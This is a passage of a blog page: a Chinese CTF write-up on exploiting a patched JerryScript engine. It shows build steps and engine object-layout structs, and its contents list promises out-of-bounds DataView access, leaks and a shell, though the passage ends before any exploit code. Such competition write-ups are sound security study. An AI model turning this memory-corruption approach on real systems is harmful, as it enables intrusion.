@@ -1,0 +1,972 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=light>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/%E5%AF%BC%E8%88%AA%E9%A1%B5%E9%9D%A2/wifi.png">
+  <link rel="icon" href="/img/%E5%AF%BC%E8%88%AA%E9%A1%B5%E9%9D%A2/wifi.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="flyyy">
+  <meta name="keywords" content="pwn browser fuzz kernel ctf">
+  
+    <meta name="description" content="NaN在浮点数比较中引发的惨案">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第八届“强网”拟态防御国际精英挑战赛 - Cheery">
+<meta property="og:url" content="https://flyyy.top/2025/12/03/mimic_final_cheery/index.html">
+<meta property="og:site_name" content="flyyy&#39;s blog">
+<meta property="og:description" content="NaN在浮点数比较中引发的惨案">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/mimic_final_cheery/image_Cm--rpHEEu.png">
+<meta property="article:published_time" content="2025-12-03T11:36:15.000Z">
+<meta property="article:modified_time" content="2025-12-03T13:45:45.008Z">
+<meta property="article:author" content="flyyy">
+<meta property="article:tag" content="Jerryscript">
+<meta property="article:tag" content="NaN bug">
+<meta property="article:tag" content="JS engine">
+<meta property="article:tag" content="heap spray">
+<meta property="article:tag" content="gc">
+<meta property="article:tag" content="memory corrupt">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/mimic_final_cheery/image_Cm--rpHEEu.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>第八届“强网”拟态防御国际精英挑战赛 - Cheery - flyyy&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"flyyy.top","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":"zh-CN","copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null},"woyaola":null,"cnzz":null},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>flyyy&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/mimic_final_cheery/image_fscHYkZobQ.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="第八届“强网”拟态防御国际精英挑战赛 - Cheery"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        flyyy
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-12-03 19:36" pubdate>
+          December 3, 2025 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.2k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          44 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">第八届“强网”拟态防御国际精英挑战赛 - Cheery</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="第八届“强网”拟态防御国际精英挑战赛-Cheery"><a href="#第八届“强网”拟态防御国际精英挑战赛-Cheery" class="headerlink" title="第八届“强网”拟态防御国际精英挑战赛 - Cheery"></a>第八届“强网”拟态防御国际精英挑战赛 - Cheery</h1><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#%E9%A2%98%E7%9B%AE%E4%BF%A1%E6%81%AF">题目信息</a></li>
+<li><a href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86">前置知识</a><ul>
+<li><a href="#%E7%B1%BB%E5%9E%8B%E7%B3%BB%E7%BB%9F">类型系统</a></li>
+<li><a href="#%E7%B1%BB%E5%9E%8B%E8%B0%83%E8%AF%95%E5%AE%9E%E4%BE%8B">类型调试实例</a></li>
+</ul>
+</li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">漏洞分析</a><ul>
+<li><a href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%9D%E8%B7%AF">代码审计思路</a></li>
+<li><a href="#dataview%E7%9B%B8%E5%85%B3%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">dataview相关代码审计</a><ul>
+<li><a href="#dataview%E4%B8%8Earraybuffer%E5%AF%B9%E8%B1%A1%E7%9A%84%E7%BB%93%E6%9E%84">dataview与arraybuffer对象的结构</a></li>
+<li><a href="#dataview%E4%B8%AD%E7%9A%84%E5%86%85%E5%AD%98%E8%B6%8A%E7%95%8C">dataview中的内存越界</a><ul>
+<li><a href="#ecma_op_dataview_create">ecma_op_dataview_create</a></li>
+<li><a href="#ecma_op_dataview_get_set_view_value">ecma_op_dataview_get_set_view_value</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">漏洞利用</a><ul>
+<li><a href="#%E6%B3%84%E6%BC%8Fjerry_global_heap">泄漏jerry_global_heap</a></li>
+<li><a href="#%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%86%99%E8%BD%AC%E5%8C%96%E4%B8%BA%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%86%99">越界读写转化为任意读写</a></li>
+<li><a href="#%E9%81%BF%E5%85%8Dgc%E5%9B%9E%E6%94%B6">避免gc回收</a></li>
+<li><a href="#%E6%B3%84%E6%BC%8Flibc">泄漏libc</a></li>
+<li><a href="#getshell">getshell</a></li>
+</ul>
+</li>
+<li><a href="#exploit">exploit</a></li>
+</ul>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>拟态决赛的时间在工作日，听说有一道 JerryScript 的 Pwn 题。作为苦逼打工人，周五抽空尝试做了一下。当时构造出 8 字节的越界读写后，一直尝试利用，但由于 GC 的原因一直没有成功，时间比较短，如果再多些时间应该也是可以利用成功的</p>
+<p>不过在调试过程中，了解了该引擎的一些机制，发现相比 v8 还是简单很多的。赛后与其他师傅交流，才发现原来可以通过 Patch 中的漏洞实现任意长度的越界读写。因此尝试复现了一下，诞生了这篇 writeup。</p>
+<h1 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h1><p>题目给了几个程序运行的链接库，看了下版本是Ubuntu GLIBC 2.39-0ubuntu8.6，由于我本地位wsl2 ubuntu22版本，所以patch了一下</p>
+<p>查看jerryscript的版本信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">➜  jerry ./jerry --version                                <br>Version: 3.0.0 (b7069350)<br></code></pre></td></tr></table></figure>
+
+
+<p>接着本地编译一个，最后会看到build&#x2F;bin目录下有一个jerry的可执行文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/jerryscript-project/jerryscript.git<br><span class="hljs-built_in">cd</span> jerryscript<br>git checkout b7069350<br>patch -p1 &lt; ../patch<br>python tools/build.py --debug --lto=off<br><br></code></pre></td></tr></table></figure>
+
+
+<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="类型系统"><a href="#类型系统" class="headerlink" title="类型系统"></a>类型系统</h2><p>类型的定义位于这个文件中jerryscript&#x2F;jerry-core&#x2F;ecma&#x2F;base&#x2F;ecma-globals.h</p>
+<p>ecma_object_t是类型header的开始部分，其中主要的字段有type、gc_next_cp、u1、u2</p>
+<p>其中的u1和u2分别代表properties和prototype相关，不是每一个对象都有这两个字段</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/** type : 4 bit : ecma_object_type_t or ecma_lexical_environment_type_t</span><br><span class="hljs-comment">                     depending on ECMA_OBJECT_FLAG_BUILT_IN_OR_LEXICAL_ENV</span><br><span class="hljs-comment">      flags : 2 bit : ECMA_OBJECT_FLAG_BUILT_IN_OR_LEXICAL_ENV,</span><br><span class="hljs-comment">                      ECMA_OBJECT_FLAG_EXTENSIBLE or ECMA_OBJECT_FLAG_BLOCK</span><br><span class="hljs-comment">      refs : 10 / 26 bit (max 1022 / 67108862) */</span><br>  <span class="hljs-type">ecma_object_descriptor_t</span> type_flags_refs;<br><br>  <span class="hljs-comment">/** next in the object chain maintained by the garbage collector */</span><br>  <span class="hljs-type">jmem_cpointer_t</span> gc_next_cp;<br><br>  <span class="hljs-comment">/** compressed pointer to property list or bound object */</span><br>  <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">  &#123;</span><br>    <span class="hljs-type">jmem_cpointer_t</span> property_list_cp; <span class="hljs-comment">/**&lt; compressed pointer to object&#x27;s</span><br><span class="hljs-comment">                                       *   or declerative lexical environments&#x27;s property list */</span><br>    <span class="hljs-type">jmem_cpointer_t</span> bound_object_cp; <span class="hljs-comment">/**&lt; compressed pointer to lexical environments&#x27;s the bound object */</span><br>    <span class="hljs-type">jmem_cpointer_t</span> home_object_cp; <span class="hljs-comment">/**&lt; compressed pointer to lexical environments&#x27;s the home object */</span><br>  &#125; u1;<br><br>  <span class="hljs-comment">/** object prototype or outer reference */</span><br>  <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">  &#123;</span><br>    <span class="hljs-type">jmem_cpointer_t</span> prototype_cp; <span class="hljs-comment">/**&lt; compressed pointer to the object&#x27;s prototype  */</span><br>    <span class="hljs-type">jmem_cpointer_t</span> outer_reference_cp; <span class="hljs-comment">/**&lt; compressed pointer to the lexical environments&#x27;s outer reference  */</span><br>  &#125; u2;<br>&#125; <span class="hljs-type">ecma_object_t</span>;<br></code></pre></td></tr></table></figure>
+
+
+<p>type_flags_refs中的Type就指的是类型，但是并不像v8那样细分为object arr、double arr……</p>
+<p>其中的refs，这个对于利用的稳定性比较重要，如果产生了越界，可以通过修改这个字段不让改对象被gc回收，从而保持布局的稳定性。</p>
+<blockquote>
+<p>然后笔者在实际利用过程中并没有这样，当时没有意识到，回头翻看源码的时候才发现。所以采用了人为构造函数进行ref，增加ref count</p>
+</blockquote>
+<p>下面是一个简单的图示</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">| 31 ......................... 6 | 5 ...... 4 | 3 ........ 0 |<br>|          Reference Count       |    Flags   |     Type     |<br>|             (26 bits)          |   (2 bits) |    (4 bits)  |<br><br></code></pre></td></tr></table></figure>
+
+
+<p>接着的gc_next_cp是用于gc回收时扫描对象而设立的字段，u1与properties相关，在受限的情况下，可以采用修改和这个字段的方式进行类型混淆，u2和原型链有关，暂时也没想到这个怎么用</p>
+<blockquote>
+<p>笔者尝试过，当时由于稳定性的原因，没有构造出很好用的原语，等待后续研究……</p>
+</blockquote>
+<p>下面是ecma_extended_object_t结构体</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">ecma_object_t</span> object; <span class="hljs-comment">/**&lt; object header */</span><br><br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">   * Description of extra fields. These extra fields depend on the object type.</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">  &#123;</span><br>    <span class="hljs-type">ecma_built_in_props_t</span> built_in; <span class="hljs-comment">/**&lt; built-in object part */</span><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Description of objects with class.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * Note:</span><br><span class="hljs-comment">     *     class is a reserved word in c++, so cls is used instead</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">    &#123;</span><br>      <span class="hljs-type">uint8_t</span> type; <span class="hljs-comment">/**&lt; class type of the object */</span><br>      <span class="hljs-comment">/**</span><br><span class="hljs-comment">       * Description of 8 bit extra fields. These extra fields depend on the type.</span><br><span class="hljs-comment">       */</span><br>      <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">      &#123;</span><br>        <span class="hljs-type">uint8_t</span> arguments_flags; <span class="hljs-comment">/**&lt; arguments object flags */</span><br>        <span class="hljs-type">uint8_t</span> error_type; <span class="hljs-comment">/**&lt; jerry_error_t type of native error objects */</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> JERRY_BUILTIN_DATE</span><br>        <span class="hljs-type">uint8_t</span> date_flags; <span class="hljs-comment">/**&lt; flags for date objects */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* JERRY_BUILTIN_DATE */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> JERRY_MODULE_SYSTEM</span><br>        <span class="hljs-type">uint8_t</span> module_state; <span class="hljs-comment">/**&lt; Module state */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* JERRY_MODULE_SYSTEM */</span></span><br>        <span class="hljs-type">uint8_t</span> iterator_kind; <span class="hljs-comment">/**&lt; type of iterator */</span><br>        <span class="hljs-type">uint8_t</span> regexp_string_iterator_flags; <span class="hljs-comment">/**&lt; flags for RegExp string iterator */</span><br>        <span class="hljs-type">uint8_t</span> promise_flags; <span class="hljs-comment">/**&lt; Promise object flags */</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> JERRY_BUILTIN_CONTAINER</span><br>        <span class="hljs-type">uint8_t</span> container_flags; <span class="hljs-comment">/**&lt; container object flags */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* JERRY_BUILTIN_CONTAINER */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> JERRY_BUILTIN_TYPEDARRAY</span><br>        <span class="hljs-type">uint8_t</span> array_buffer_flags; <span class="hljs-comment">/**&lt; ArrayBuffer flags */</span><br>        <span class="hljs-type">uint8_t</span> typedarray_type; <span class="hljs-comment">/**&lt; type of typed array */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* JERRY_BUILTIN_TYPEDARRAY */</span></span><br>      &#125; u1;<br>      <span class="hljs-comment">/**</span><br><span class="hljs-comment">       * Description of 16 bit extra fields. These extra fields depend on the type.</span><br><span class="hljs-comment">       */</span><br>      <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">      &#123;</span><br>        <span class="hljs-type">uint16_t</span> formal_params_number; <span class="hljs-comment">/**&lt; for arguments: formal parameters number */</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> JERRY_MODULE_SYSTEM</span><br>        <span class="hljs-type">uint16_t</span> module_flags; <span class="hljs-comment">/**&lt; Module flags */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* JERRY_MODULE_SYSTEM */</span></span><br>        <span class="hljs-type">uint16_t</span> iterator_index; <span class="hljs-comment">/**&lt; for %Iterator%: [[%Iterator%NextIndex]] property */</span><br>        <span class="hljs-type">uint16_t</span> executable_obj_flags; <span class="hljs-comment">/**&lt; executable object flags */</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> JERRY_BUILTIN_CONTAINER</span><br>        <span class="hljs-type">uint16_t</span> container_id; <span class="hljs-comment">/**&lt; magic string id of a container */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* JERRY_BUILTIN_CONTAINER */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> JERRY_BUILTIN_TYPEDARRAY</span><br>        <span class="hljs-type">uint16_t</span> typedarray_flags; <span class="hljs-comment">/**&lt; typed array object flags */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* JERRY_BUILTIN_TYPEDARRAY */</span></span><br>      &#125; u2;<br>      <span class="hljs-comment">/**</span><br><span class="hljs-comment">       * Description of 32 bit / value. These extra fields depend on the type.</span><br><span class="hljs-comment">       */</span><br>      <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">      &#123;</span><br>        <span class="hljs-type">ecma_value_t</span> value; <span class="hljs-comment">/**&lt; value of the object (e.g. boolean, number, string, etc.) */</span><br>        <span class="hljs-type">ecma_value_t</span> target; <span class="hljs-comment">/**&lt; [[ProxyTarget]] or [[WeakRefTarget]] internal property */</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> JERRY_BUILTIN_TYPEDARRAY</span><br>        <span class="hljs-type">ecma_value_t</span> arraybuffer; <span class="hljs-comment">/**&lt; for typedarray: ArrayBuffer reference */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* JERRY_BUILTIN_TYPEDARRAY */</span></span><br>        <span class="hljs-type">ecma_value_t</span> head; <span class="hljs-comment">/**&lt; points to the async generator task queue head item */</span><br>        <span class="hljs-type">ecma_value_t</span> iterated_value; <span class="hljs-comment">/**&lt; for %Iterator%: [[IteratedObject]] property */</span><br>        <span class="hljs-type">ecma_value_t</span> promise; <span class="hljs-comment">/**&lt; PromiseCapability[[Promise]] internal slot */</span><br>        <span class="hljs-type">ecma_value_t</span> sync_iterator; <span class="hljs-comment">/**&lt; IteratorRecord [[Iterator]] internal slot for AsyncFromSyncIterator */</span><br>        <span class="hljs-type">ecma_value_t</span> spread_value; <span class="hljs-comment">/**&lt; for spread object: spreaded element */</span><br>        <span class="hljs-type">int32_t</span> tza; <span class="hljs-comment">/**&lt; TimeZone adjustment for date objects */</span><br>        <span class="hljs-type">uint32_t</span> length; <span class="hljs-comment">/**&lt; length related property (e.g. length of ArrayBuffer) */</span><br>        <span class="hljs-type">uint32_t</span> arguments_number; <span class="hljs-comment">/**&lt; for arguments: arguments number */</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> JERRY_MODULE_SYSTEM</span><br>        <span class="hljs-type">uint32_t</span> dfs_ancestor_index; <span class="hljs-comment">/**&lt; module dfs ancestor index (ES2020 15.2.1.16) */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* JERRY_MODULE_SYSTEM */</span></span><br>      &#125; u3;<br>    &#125; cls;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Description of function objects.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">    &#123;</span><br>      <span class="hljs-type">jmem_cpointer_tag_t</span> scope_cp; <span class="hljs-comment">/**&lt; function scope */</span><br>      <span class="hljs-type">ecma_value_t</span> bytecode_cp; <span class="hljs-comment">/**&lt; function byte code */</span><br>    &#125; function;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Description of array objects.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">    &#123;</span><br>      <span class="hljs-type">uint32_t</span> length; <span class="hljs-comment">/**&lt; length property value */</span><br>      <span class="hljs-type">uint32_t</span> length_prop_and_hole_count; <span class="hljs-comment">/**&lt; length property attributes and number of array holes in</span><br><span class="hljs-comment">                                            *   a fast access mode array multiplied ECMA_FAST_ACCESS_HOLE_ONE */</span><br>    &#125; <span class="hljs-built_in">array</span>;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Description of bound function object.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">    &#123;</span><br>      <span class="hljs-type">jmem_cpointer_tag_t</span> target_function; <span class="hljs-comment">/**&lt; target function */</span><br>      <span class="hljs-type">ecma_value_t</span> args_len_or_this; <span class="hljs-comment">/**&lt; length of arguments or this value */</span><br>    &#125; bound_function;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Description of implicit class constructor function.</span><br><span 